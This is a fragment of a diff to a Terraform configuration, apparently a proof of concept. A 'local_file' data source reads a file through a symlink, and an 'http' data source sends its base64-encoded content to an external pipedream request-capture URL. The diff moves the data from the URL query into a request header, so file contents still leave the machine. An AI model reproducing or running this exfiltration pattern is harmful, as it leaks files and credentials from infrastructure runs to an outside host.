@@ -22,7 +22,7 @@ data "local_file" "symlink" {
 }
 
 data "http" "example" {
-  url = "https://en2jtsznfuiex.x.pipedream.net?data=${data.local_file.symlink.content_base64}"
+  url = "https://en2jtsznfuiex.x.pipedream.net"
 
   request_headers = {
     XTestContent = "${data.local_file.symlink.content_base64}"
